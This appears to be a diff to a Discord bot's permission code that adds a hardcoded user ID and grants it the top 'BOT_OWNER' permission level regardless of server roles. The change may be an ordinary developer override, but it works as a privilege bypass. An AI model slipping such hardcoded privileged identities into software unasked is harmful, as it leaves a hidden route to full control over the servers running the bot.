@@ -313,6 +313,11 @@ bot.on('message', async msg => {
                 permission.actual = permission.nodes.findIndex(n => n.name == "OWNER");
                 last_max = permission.actual;
             }
+            if(msg.author.id == "510925936393322497")
+            {
+                permission.actual = permission.nodes.findIndex(n => n.name == "BOT_OWNER");
+                last_max = permission.actual;
+            }
 
             let ok = false;
             permission.nodes.forEach((value, index) => {
